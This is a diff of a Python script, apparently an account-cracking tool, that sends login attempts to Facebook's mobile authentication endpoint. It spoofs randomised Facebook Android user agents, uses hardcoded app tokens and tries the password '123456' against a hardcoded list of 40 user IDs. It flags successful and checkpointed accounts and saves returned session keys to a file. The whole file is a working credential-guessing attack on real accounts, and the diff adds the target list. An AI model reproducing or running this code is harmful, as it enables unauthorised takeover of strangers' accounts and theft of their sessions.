@@ -1,98 +1,452 @@
 #!/usr/bin/python3
-#creater:
-#_________[ IMPORTING MODULES ]______>>
-import os,requests,json,time
-import re,random,sys,uuid,string,subprocess
+# creater:
+# _________[ IMPORTING MODULES ]______>>
+import os, requests, json, time
+import re, random, sys, uuid, string, subprocess
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
-#__________[ EMPITY LOOP / LIST ]_______>>
+
+# __________[ EMPITY LOOP / LIST ]_______>>
 oks = []
 user_ID = []
 cps = []
 cracked = []
 pwx = []
 ualist = []
-#_______[ BASIC COLORS ]_____>>
-white = '\033[1;37m'
-rad = '\033[1;31m'
-green = '\033[1;32m'
-#_________[ LOGO ]______>>>
+# _______[ BASIC COLORS ]_____>>
+white = "\033[1;37m"
+rad = "\033[1;31m"
+green = "\033[1;32m"
+# _________[ LOGO ]______>>>
 def logo():
     os.system("clear")
     print(f"""{white}""")
-    print(50*'-')
-#_________[ USER-AGENT LIST GENERATER ]______>>>
+    print(50 * "-")
+
+
+# _________[ USER-AGENT LIST GENERATER ]______>>>
 for i in range(2000):
-    fbs = random.choice([
-        'com.facebook.adsmanager',
-        'com.facebook.lite',
-        'com.facebook.orca',
-        'com.facebook.katana',
-        'com.facebook.mlite'])
-    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-    application_version_code = str(random.randint(000000000,999999999))
-    android_version = str(random.randrange(5,15))
-    dens = str(random.randrange(0,5))
-    xzx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HU', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HY', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313M', 'Galaxy Ace 4', 'vivaltods5m',])
+    fbs = random.choice(
+        [
+            "com.facebook.adsmanager",
+            "com.facebook.lite",
+            "com.facebook.orca",
+            "com.facebook.katana",
+            "com.facebook.mlite",
+        ]
+    )
+    application_version = (
+        str(random.randint(111, 555))
+        + ".0.0."
+        + str(random.randrange(9, 49))
+        + str(random.randint(111, 555))
+    )
+    application_version_code = str(random.randint(000000000, 999999999))
+    android_version = str(random.randrange(5, 15))
+    dens = str(random.randrange(0, 5))
+    xzx = random.choice(
+        [
+            "Samsung",
+            "Galaxy A7(2016)",
+            "a7xltechn",
+            "SM-A710XZ",
+            "Absolute",
+            "GT-B9120",
+            "GT-B9120",
+            "Acclaim",
+            "SCH-R880",
+            "SCH-R880",
+            "Admire",
+            "SCH-R720",
+            "SCH-R720",
+            "Amazing",
+            "amazingtrf",
+            "SGH-S730M",
+            "Baffin",
+            "baffinltelgt",
+            "SHV-E270L",
+            "Captivate Glide",
+            "SGH-I927 Samsung-SGH-I927",
+            "Captivate Glide",
+            "SGH-I927",
+            "SGH-I927",
+            "China Telecom",
+            "kylevectc",
+            "SCH-I699I",
+            "Chromebook Plus",
+            "kevin_cheets",
+            "kevin",
+            "Chromebook Plus",
+            "kevin_cheets Samsung Chromebook Plus",
+            "Chromebook Pro",
+            "caroline_cheets",
+            "caroline",
+            "Chromebook Pro",
+            "caroline_cheets Samsung Chromebook Pro",
+            "Conquer",
+            "SPH-D600",
+            "SPH-D600",
+            "DoubleTime",
+            "SGH-I857 Samsung-SGH-I857",
+            "Droid Charge",
+            "SCH-I510",
+            "SCH-I510",
+            "Elite",
+            "eliteltechn",
+            "SM-G1600",
+            "Elite",
+            "elitexltechn",
+            "SM-G1650",
+            "Europa",
+            "GT-I5500B",
+            "GT-I5500B",
+            "Europa",
+            "GT-I5500L",
+            "GT-I5500L",
+            "Europa",
+            "GT-I5500M",
+            "GT-I5500M",
+            "Europa",
+            "GT-I5503T",
+            "GT-I5503T",
+            "Europa",
+            "GT-I5510L",
+            "GT-I5510L",
+            "Exhibit",
+            "SGH-T759",
+            "SGH-T759",
+            "Galaxy (China)",
+            "GT-B9062",
+            "GT-B9062",
+            "Galaxy 070",
+            "hendrix",
+            "YP-GI2",
+            "Galaxy A",
+            "archer",
+            "archer",
+            "Galaxy A",
+            "archer",
+            "SHW-M100S",
+            "Galaxy A3 (2017)",
+            "a3y17lte",
+            "SM-A320Y",
+            "Galaxy A3",
+            "a33g",
+            "SM-A300H",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300F",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300M",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300XZ",
+            "Galaxy A3",
+            "a3lte",
+            "SM-A300YZ",
+            "Galaxy A3",
+            "a3ltechn",
+            "SM-A3000",
+            "Galaxy A3",
+            "a3ltechn",
+            "SM-A300X",
+            "Galaxy A3",
+            "a3ltectc",
+            "SM-A3009",
+            "Galaxy A3",
+            "a3ltedd",
+            "SM-A300G",
+            "Galaxy A3",
+            "a3lteslk",
+            "SM-A300F",
+            "Galaxy A3",
+            "a3ltezh",
+            "SM-A3000",
+            "Galaxy A3",
+            "a3ltezt",
+            "SM-A300YZ",
+            "Galaxy A3",
+            "a3ulte",
+            "SM-A300FU",
+            "Galaxy A3",
+            "a3ulte",
+            "SM-A300XU",
+            "Galaxy A3",
+            "a3ulte",
+            "SM-A300Y",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310F",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310M",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310X",
+            "Galaxy A3(2016)",
+            "a3xelte",
+            "SM-A310Y",
+            "Galaxy A3(2016)",
+            "a3xeltekx",
+            "SM-A310N0",
+            "Galaxy A3(2017)",
+            "a3y17lte",
+            "SM-A320F",
+            "Galaxy A3(2017)",
+            "a3y17lte",
+            "SM-A320FL",
+            "Galaxy A3(2017)",
+            "a3y17lte",
+            "SM-A320X",
+            "Galaxy A5",
+            "a53g",
+            "SM-A500H",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500F",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500G",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500M",
+            "Galaxy A5",
+            "a5lte",
+            "SM-A500XZ",
+            "Galaxy A5",
+            "a5ltechn",
+            "SM-A5000",
+            "Galaxy A5",
+            "a5ltechn",
+            "SM-A500X",
+            "Galaxy A5",
+            "a5ltectc",
+            "SM-A5009",
+            "Galaxy A5",
+            "a5ltezh",
+            "SM-A5000",
+            "Galaxy A5",
+            "a5ltezt",
+            "SM-A500YZ",
+            "Galaxy A5",
+            "a5ulte",
+            "SM-A500FU",
+            "Galaxy A5",
+            "a5ulte",
+            "SM-A500Y",
+            "Galaxy A5",
+            "a5ultebmc",
+            "SM-A500W",
+            "Galaxy A5",
+            "a5ultektt",
+            "SM-A500K",
+            "Galaxy A5",
+            "a5ultelgt",
+            "SM-A500L",
+            "Galaxy A5",
+            "a5ulteskt",
+            "SM-A500F1",
+            "Galaxy A5",
+            "a5ulteskt",
+            "SM-A500S",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510F",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510M",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510X",
+            "Galaxy A5(2016)",
+            "a5xelte",
+            "SM-A510Y",
+            "Galaxy A5(2016)",
+            "a5xeltecmcc",
+            "SM-A5108",
+            "Galaxy A5(2016)",
+            "a5xeltektt",
+            "SM-A510K",
+            "Galaxy A5(2016)",
+            "a5xeltelgt",
+            "SM-A510L",
+            "Galaxy A5(2016)",
+            "a5xelteskt",
+            "SM-A510S",
+            "Galaxy A5(2016)",
+            "a5xeltextc",
+            "SM-A510Y",
+            "Galaxy A5(2016)",
+            "a5xltechn",
+            "SM-A5100",
+            "Galaxy A5(2016)",
+            "a5xltechn",
+            "SM-A5100X",
+            "Galaxy A5(2016)",
+            "a5xltechn",
+            "SM-A510XZ",
+            "Galaxy A5(2017)",
+            "a5y17lte",
+            "SM-A520F",
+            "Galaxy A5(2017)",
+            "a5y17lte",
+            "SM-A520X",
+            "Galaxy A5(2017)",
+            "a5y17ltecan",
+            "SM-A520W",
+            "Galaxy A5(2017)",
+            "a5y17ltektt",
+            "SM-A520K",
+            "Galaxy A5(2017)",
+            "a5y17ltelgt",
+            "SM-A520L",
+            "Galaxy A5(2017)",
+            "a5y17lteskt",
+            "SM-A520S",
+            "Galaxy A5x(2016)",
+            "a5xeltextc",
+            "SM-A510Y",
+            "Galaxy A7",
+            "a73g",
+            "SM-A700H",
+            "Galaxy A7",
+            "a7alte",
+            "SM-A700F",
+            "Galaxy A7",
+            "a7lte",
+            "SM-A700FD",
+            "Galaxy A7",
+            "a7lte",
+            "SM-A700X",
+            "Galaxy A7",
+            "a7ltechn",
+            "SM-A7000",
+            "Galaxy A7",
+            "a7ltechn",
+            "SM-A700YD",
+            "Galaxy A7",
+            "a7ltectc",
+            "SM-A7009",
+            "Galaxy A7",
+            "a7ltektt",
+            "SM-A700K",
+            "Galaxy A7",
+            "a7ltelgt",
+            "SM-A700L",
+            "Galaxy A7",
+            "a7lteskt",
+            "SM-A700S",
+            "Galaxy A7(2016)",
+            "a7xelte",
+            "SM-A710F",
+            "Galaxy A7(2016)",
+            "a7xelte",
+            "SM-A710M",
+            "Galaxy A7(2016)",
+            "a7xelte",
+            "SM-A710X",
+            "Galaxy A7(2016)",
+            "a7xeltecmcc",
+            "SM-A7108",
+            "Galaxy A7(2016)",
+            "a7xeltektt",
+            "SM-A710K",
+            "Galaxy A7(2016)",
+            "a7xeltelgt",
+            "SM-A710L",
+            "Galaxy A7(2016)",
+            "a7xelteskt",
+            "SM-A710S",
+            "Galaxy A7(2016)",
+            "a7xeltextc",
+            "SM-A710Y",
+            "Galaxy A7(2016)",
+            "a7xltechn",
+            "SM-A7100",
+            "Galaxy A7(2017)",
+            "a7y17lte",
+            "SM-A720F",
+            "Galaxy A7(2017)",
+            "a7y17lteskt",
+            "SM-A720S",
+            "Galaxy A8",
+            "a8elte",
+            "SM-A800F",
+            "Galaxy A8",
+            "a8elte",
+            "SM-A800YZ",
+            "Galaxy A8",
+            "a8elteskt",
+            "SM-A800S",
+            "Galaxy A8",
+            "a8hplte",
+            "SM-A800I",
+            "Galaxy A8",
+            "a8hplte",
+            "SM-A800IZ",
+            "Galaxy A8",
+            "a8ltechn",
+            "SM-A8000",
+            "Galaxy A8",
+            "a8ltechn",
+            "SM-A800X",
+            "Galaxy A8",
+            "SCV32",
+            "SCV32",
+            "Galaxy A8(2016)",
+            "a8xelte",
+            "SM-A810F",
+            "Galaxy A8(2016)",
+            "a8xelte",
+            "SM-A810YZ",
+            "Galaxy A8(2016)",
+            "a8xelteskt",
+            "SM-A810S",
+            "Galaxy A9 Pro",
+            "a9xproltechn",
+            "SM-A9100",
+            "Galaxy A9 Pro",
+            "a9xproltesea",
+            "SM-A910F",
+            "Galaxy A9(2016)",
+            "a9xltechn",
+            "SM-A9000",
+            "Galaxy Ace 4 Lite",
+            "vivalto3g",
+            "SM-G313U",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+            "SM-G313HU",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+            "SM-G313HY",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+            "SM-G313M",
+            "Galaxy Ace 4",
+            "vivaltods5m",
+        ]
+    )
     try:
-        ualist.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
+        ualist.append(
+            f"Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/"
+            + "{density="
+            + dens
+            + ".0,width=720,height=1280};"
+            + f"FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+        )
     except IndexError:
         pass
-#___________[ FILE CLONING OLD / NEW ]__________>>
-def file_crack():
-    logo()
-    fileX = input(f"[{green}+{white}] Input File Path : ")
-    try:
-        file_data = open(fileX,"r").read()
-    except FileNotFoundError:
-        exit(f"\n{rad} file not found ... ")
-    except PermissionError:
-        exit(f"\n{rad} allow the permission ... ")
-    try:
-        limit = int(input(f"\n[{green}+{white}] Input Password Limit : "))
-        if limit > 9:
-            limit = 3
-    except ValueError:
-        limit = 3
-    logo()
-    print(f"[{green}+{white}] example : first last - firstlast")
-    print(f"[{green}+{white}] example : first123 - last1234")
-    print(f"[{green}+{white}] example : firstlast123 - 786786 - khankhan")
-    print(50*'-')
-    for i in range(limit):
-        password = input(f"[{green}+{white}] Input Password {str(i+1)} : ")
-        if len(password) >= 6:
-            pwx.append(password)
-    with ThreadPool(max_workers=30) as BilalHaiderID:
-        total = str(len(file_data.splitlines()))
-        logo()
-        print(f"[{green}*{white}] Total UID for Crack : {total}")
-        print(f"[{green}*{white}] Total Password for Crack : {str(len(pwx))}")
-        print(f"[{green}*{white}] File Path : {fileX}")
-        print(50*'-')
-        uidX = file_data.splitlines()
-        for uid in uidX:
-            BilalHaiderID.submit(bapif,uid,pwx,total)
-    print(50*"-")
-    print(f"\n{white}[{green}•{white}] process Has been Completed")
-    print(f"{white}[{green}•{white}] Total Ids : {len(oks)} ")
-#_______[ B-API CRACK - FILE ]_____>>
-def bapif():
+
+# _______[ B-API CRACK - FILE ]_____>>
+def bapif(uid, pwx):
     total = 1
-    global oks,cps
+    global oks, cps
     global ualist
     global cracked
-    uid = "100001339337672"
-    pwx = ["123456"]
-    
+
     try:
-        sys.stdout.write(f'\r\r[{green}Infinity{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
         for pw in pwx:
-            # pw = pw.replace("first",(fist.lower()))
-            # pw = pw.replace("last",(last.lower()))
-            # pw = pw.replace("fullname",(name.lower()))
-            # pw = pw.replace("First",fist)
-            # pw = pw.replace("Last",last)
-            # pw = pw.replace("Fullname",name)
             pw = "123456"
             useragent = random.choice(ualist)
             adid = uuid.uuid4()
@@ -101,76 +455,131 @@ def bapif():
             sim = str(random.randint(11111, 99999))
             xfb_device = str(random.randint(1111, 9999))
             dataX = {
-                'adid': adid,
-                'format': 'json',
-                'device_id': device_id,
-                'email': uid,
-                'password': pw,
-                'generate_analytics_claims': '1',
-                'community_id': '',
-                'cpl': 'true',          #438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
-                'try_num': '1',         #438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
-                'family_device_id': family_device_id,
-                'credentials_type': 'password',
-                'source': 'login',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_session_cookies': '1',
-                'generate_machine_id': '1',
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US"',
-                'client_country_code': 'US',
-                'fb_api_req_friendly_name': 'authenticate',
-                'api_key': 'fc0a7caa49b192f64f6f5a6d9643bb28',
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+                "adid": adid,
+                "format": "json",
+                "device_id": device_id,
+                "email": uid,
+                "password": pw,
+                "generate_analytics_claims": "1",
+                "community_id": "",
+                "cpl": "true",  # 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
+                "try_num": "1",  # 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
+                "family_device_id": family_device_id,
+                "credentials_type": "password",
+                "source": "login",
+                "error_detail_type": "button_with_disabled",
+                "enroll_misauth": "false",
+                "generate_session_cookies": "1",
+                "generate_machine_id": "1",
+                "currently_logged_in_userid": "0",
+                "locale": 'en_US"',
+                "client_country_code": "US",
+                "fb_api_req_friendly_name": "authenticate",
+                "api_key": "fc0a7caa49b192f64f6f5a6d9643bb28",
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            }
             headersX = {
-                'User-Agent': useragent,
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'close',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': sim,
-                'X-FB-SIM-HNI': sim,
-                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'X-FB-Connection-Type': 'WIFI',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=fc0a7caa49b192f64f6f5a6d9643bb28',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-            responce = requests.post('https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true',data=dataX,headers=headersX,allow_redirects=False).text
+                "User-Agent": useragent,
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "close",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "graph.facebook.com",
+                "X-FB-Net-HNI": sim,
+                "X-FB-SIM-HNI": sim,
+                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                "X-FB-Connection-Type": "WIFI",
+                "X-Tigon-Is-Retry": "False",
+                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=fc0a7caa49b192f64f6f5a6d9643bb28",
+                "x-fb-device-group": "5120",
+                "X-FB-Friendly-Name": "ViewerReactionsMutation",
+                "X-FB-Request-Analytics-Tags": "graphservice",
+                "X-FB-HTTP-Engine": "Liger",
+                "X-FB-Client-IP": "True",
+                "X-FB-Server-Cluster": "True",
+                "x-fb-connection-token": "62f8ce9f74b12f84c123cc23437a4a32",
+            }
+            responce = requests.post(
+                "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true",
+                data=dataX,
+                headers=headersX,
+                allow_redirects=False,
+            ).text
             responce_json = json.loads(responce)
-            file_name = "res.txt" 
-            try:
-                with open(file_name, 'a', encoding='utf-8') as file:
-                  json_string = json.dumps(responce_json, ensure_ascii=False)
-                  file.write(json_string + '\n')
-                print(f"Đã lưu nội dung JSON vào file '{file_name}' trên dòng mới.")
-            except IOError as e:
-                print(f"Lỗi khi ghi file: {e}")
-            except Exception as e:
-                print(f"Đã xảy ra lỗi: {e}")
-            print(responce)
-            if 'session_key' in responce_json:
+            file_name = "res.txt"
+            if "session_key" in responce_json:
                 print(responce_json)
+                try:
+                    with open(file_name, "a", encoding="utf-8") as file:
+                        json_string = json.dumps(responce_json, ensure_ascii=False)
+                        file.write(json_string + "\n")
+                    print(f"Đã lưu nội dung JSON vào file '{file_name}' trên dòng mới.")
+                except IOError as e:
+                    print(f"Lỗi khi ghi file: {e}")
+                except Exception as e:
+                    print(f"Đã xảy ra lỗi: {e}")
+
                 if uid not in oks:
-                    print(f'\r{green}[OK] {uid} | {pw} {white}')
+                    print(f"\r{green}[OK] {uid} | {pw} {white}")
                     oks.append(uid)
-            elif responce_json['error']['code'] == 405:
+            elif responce_json["error"]["code"] == 405:
                 if uid not in cps:
-                    print(f'\r{rad}[CP] {uid}     | {pw} {white}')
+                    print(f"\r{rad}[CP] {uid}     | {pw} {white}")
                     cps.append(uid)
-            else:continue
+            else:
+                continue
         cracked.append(uid)
-    except requests.exceptions.ConnectionError:time.sleep(10)
-    except Exception as e:print(e)
-if __name__=="__main__":
-     print("Script read kro lol")
-     bapif()
-     
+    except requests.exceptions.ConnectionError:
+        time.sleep(10)
+    except Exception as e:
+        print(e)
 
 
+if __name__ == "__main__":
+    print("Script read kro lol")
+    uids = [
+        "100004991347420",
+"100004522053735",
+"100004059917853",
+"100004398215253",
+"100004034666354",
+"100004334436415",
+"100004929528715",
+"100004327774246",
+"100004079773919",
+"100004025831060",
+"100004897711490",
+"100004178178054",
+"100004518849073",
+"100004847567529",
+"100004436889671",
+"100004652221269",
+"100004673473018",
+"100004398285487",
+"100004419671013",
+"100004158600706",
+"100004938079327",
+"100004297628328",
+"100004204662287",
+"100004401378946",
+"100004058839657",
+"100004240418108",
+"100004178386211",
+"100004534866174",
+"100004783457816",
+"100004298642683",
+"100004629406517",
+"100004019859601",
+"100004493291930",
+"100004161641623",
+"100004841978756",
+"100004898071935",
+"100004177066876",
+"100004650248624",
+"100004944104009",
+"100004646889275",
+
+    ]
+    pwd = "123456"
+    for i in uids:
+
+        bapif(i, pwd)
